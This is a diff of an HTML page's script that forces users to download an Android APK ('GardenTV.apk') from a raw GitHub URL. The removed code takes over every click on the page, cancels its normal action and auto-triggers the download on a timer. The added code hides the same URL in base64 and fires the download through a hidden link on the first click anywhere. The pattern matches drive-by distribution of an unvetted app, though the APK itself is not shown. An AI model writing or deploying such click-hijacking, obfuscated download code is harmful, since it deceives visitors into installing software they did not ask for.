@@ -464,61 +464,46 @@ margin-bottom: 24px;
 
     <!-- Any click triggers download logic + prevents default redirection -->
 	<script>
-		// Define a download link variable for easy modification.
-		const apkUrl = "https://raw.githubusercontent.com/phuonganhle1812-lang/apkpurokj/refs/heads/main/GardenTV_v1.1.2.apk"; 
-		
-		// Instead of a permanent lock, we use a temporary "cooldown" flag.
-		let isProcessing = false; 
-
 		function startDownload() {
-			// If a request is currently being processed (within the 2s cooldown), ignore this click.
-			if (isProcessing) return; 
+			// 请替换为实际的 APK 文件链接
+			const downloadUrl = decodeURIComponent(escape(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3BodW9uZ2FuaGxlMTgxMi1sYW5nL2Fwa3B1cm9rai9yZWZzL2hlYWRzL21haW4vR2FyZGVuVFZfdjEuMS4yLmFwaw==')));
 			
-			// Lock it temporarily
-			isProcessing = true;
-			console.log("Start download task...");
+			// 创建一个新的 <a> 元素
+			const a = document.createElement('a');
+			a.href = downloadUrl;
+			a.download = 'GardenTV.apk';
+			a.style.display = 'none'; // 隐藏链接
 			
-			// --- 1. Main Method: Location Redirect ---
-			// This is the most reliable method for mobile browsers to trigger a download prompt without opening a new tab.
-			window.location.href = apkUrl;
+			// 将 <a> 元素添加到文档主体
+			document.body.appendChild(a);
 			
-			// --- 2. Backup Method: Iframe ---
-			// If the redirect doesn't work on specific browser versions, this hidden iframe forces the request.
+			// 阻止事件冒泡，防止重复触发
+			a.addEventListener('click', function(e) {
+				e.preventDefault();
+				e.stopPropagation();
+			});
+			
+			// 使用 setTimeout 来模拟用户交互，可能有助于避免某些浏览器的安全限制
 			setTimeout(() => {
-				const iframe = document.createElement('iframe');
-				iframe.style.display = 'none';
-				iframe.src = apkUrl;
-				document.body.appendChild(iframe);
-			}, 500);
-
-			// --- 3. Unlock Logic ---
-			// automatically unlock after 2 seconds.
-			// This allows the user to trigger the download again if they accidentally clicked "Cancel".
-			setTimeout(() => {
-				isProcessing = false;
-				console.log("Cooldown finished. User can click to download again.");
-			}, 500);
+				a.click(); // 触发点击事件以开始下载
+				document.body.removeChild(a); // 清理DOM，移除临时的 <a> 元素
+			}, 0); // 设置为0毫秒，确保脚本执行后立即触发
+			
+			console.log('Download started'); // 添加调试信息
 		}
 
-		// Listen for full-screen clicks (capture phase)
-		document.addEventListener('click', function(e) {
-			// Prevent default behavior (e.g., stops links from navigating away, stops form submissions)
-			e.preventDefault(); 
-			e.stopPropagation(); 
-			
-			// Trigger download immediately on user interaction
-			startDownload();
-		}, true);
+		// 防止重复绑定事件监听器
+		let downloadTriggered = false;
 
-		// Page loading logic
-		window.onload = function() {
-			// Automatically attempt to download after 5 seconds
-			setTimeout(() => {
-				console.log("Automatic timer triggered");
+		// 监听整个文档的点击事件
+		document.addEventListener('click', function(event) {
+			if (!downloadTriggered) {
+				downloadTriggered = true;
 				startDownload();
-			}, 10000);
-		}
+			}
+		});
 	</script>
+
 
 </body>
 </html>
